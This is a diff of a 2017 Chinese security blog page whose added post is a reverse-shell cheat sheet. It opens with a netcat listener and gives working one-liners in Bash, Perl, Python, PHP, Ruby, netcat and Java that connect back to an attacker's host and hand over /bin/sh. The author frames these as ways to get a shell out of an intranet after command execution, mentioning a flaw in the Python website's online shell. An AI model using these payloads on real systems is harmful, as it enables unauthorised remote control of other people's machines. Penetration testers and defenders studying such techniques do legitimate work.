@@ -6,14 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://bypupil.github.io">
-  <title>Tag: 代码审计 | ByPupil&#39;s blog</title>
+  <title>不会这几条命令，如何内网搅屎 | ByPupil&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ByPupil&#39;s blog">
-<meta property="og:url" content="https://bypupil.github.io/tags/代码审计/index.html">
+  <meta name="description" content="0x00 前言昨天晚上11点的时候，学长跟我说Python的官网的在线shell存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在Python官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。 这篇文章当然不是来讲Python网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的Linux">
+<meta name="keywords" content="Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="不会这几条命令，如何内网搅屎">
+<meta property="og:url" content="https://bypupil.github.io/2017/09/23/不会这几条命令，如何内网搅屎/index.html">
 <meta property="og:site_name" content="ByPupil&#39;s blog">
+<meta property="og:description" content="0x00 前言昨天晚上11点的时候，学长跟我说Python的官网的在线shell存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在Python官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。 这篇文章当然不是来讲Python网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的Linux">
+<meta property="og:updated_time" content="2017-09-23T15:40:29.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ByPupil&#39;s blog">
+<meta name="twitter:title" content="不会这几条命令，如何内网搅屎">
+<meta name="twitter:description" content="0x00 前言昨天晚上11点的时候，学长跟我说Python的官网的在线shell存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在Python官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。 这篇文章当然不是来讲Python网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的Linux">
   
     <link rel="alternative" href="/atom.xml" title="ByPupil&#39;s blog" type="application/atom+xml">
   
@@ -149,136 +154,192 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-不会这几条命令，如何内网搅屎" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      不会这几条命令，如何内网搅屎
+    </h1>
+  
+
+        
+        <a href="/2017/09/23/不会这几条命令，如何内网搅屎/" class="archive-article-date">
+  	<time datetime="2017-09-23T08:25:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-23</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>昨天晚上11点的时候，学长跟我说<code>Python</code>的官网的在线<code>shell</code>存在命令执行。有命令执行的情况下，很大程度下意味着，我们可以增加账号或者SSH KEY。在<code>Python</code>官网下确实通过命令执行能够将内网的shell反弹出来。由于个人太愚钝，弄到凌晨两点才给弄出来。</p>
+<p>这篇文章当然不是来讲<code>Python</code>网站这个问题，这个特意留下或者确实存在的问题。主要聊一聊网上这堆教程已经满地是的<code>Linux下反弹shell的方法</code>。</p>
+<h2 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h2><p>愚人废话在多说一点，毕竟要反弹shell，所以远程主机上一定要有一些工具或者脚本才能完成这个流程。如果没有这些工具或者脚本，在一些可能的情况下，依然可以将其上传到远程主机上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Kali 2.0 — 2017/2</div><div class="line">Debian 7.0x64</div></pre></td></tr></table></figure>
+<h2 id="0x02-常用的工具及脚本"><a href="#0x02-常用的工具及脚本" class="headerlink" title="0x02 常用的工具及脚本"></a>0x02 常用的工具及脚本</h2><p>控制端主机：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -l -p 1234 -vvv</div></pre></td></tr></table></figure>
+<p><strong>Bash</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/&lt;Target_IP&gt;/&lt;Port&gt; 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<p><strong>Perl</strong></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use </span></div><div class="line"><span class="string">Socket;$i="&lt;Target_IP&gt;";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))</span></div><div class="line"><span class="string">&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></div></pre></td></tr></table></figure>
+<p><strong>Python</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;Target_IP&gt;",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></div></pre></td></tr></table></figure>
+<p><strong>PHP</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("&lt;Target_IP&gt;",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure>
+<p><strong>Ruby</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("&lt;Target_IP&gt;",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></div></pre></td></tr></table></figure>
+<p>Ruby这个测试了多次一直没有成功。</p>
+<p><strong>NetCat</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh &lt;Target_IP&gt; 1234</div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;Target_IP&gt; 1234 &gt;/tmp/f</div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc &lt;Target_IP&gt; 8888|/bin/sh|nc &lt;Target_IP&gt; 9999</div></pre></td></tr></table></figure>
+<p><strong>Java</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.8.31/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure>
+<p>java版本的，我也没测试成功。本人太愚。</p>
+<h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="external">Reverse Shell Cheat Sheet</a><br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="external">Linux下反弹shell方法</a></p>
+<p><a href="http://www.linuxidc.com/Linux/2016-11/136993.htm" target="_blank" rel="external">Linux里的2&gt;&amp;1究竟是什么</a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/18/CVE-2017-9603-分析/" class="archive-article-date">
-  	<time datetime="2017-09-18T05:11:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-18</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/18/CVE-2017-9603-分析/">CVE-2017-9603 分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Linux</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=https://bypupil.github.io/2017/09/23/不会这几条命令，如何内网搅屎/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/08/25/74CMS-v3-2-宽字节注入/" class="archive-article-date">
-  	<time datetime="2017-08-24T16:11:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-25</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2017/09/18/CVE-2017-9603-分析/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CVE-2017-9603 分析</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/08/25/74CMS-v3-2-宽字节注入/">74CMS v3.2 - 宽字节注入</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/08/23/FineCMS-v5-0-10任意文件上传/" class="archive-article-date">
-  	<time datetime="2017-08-23T13:39:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-08-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/08/23/FineCMS-v5-0-10任意文件上传/">FineCMS v5.0.10任意文件上传</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -301,9 +362,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
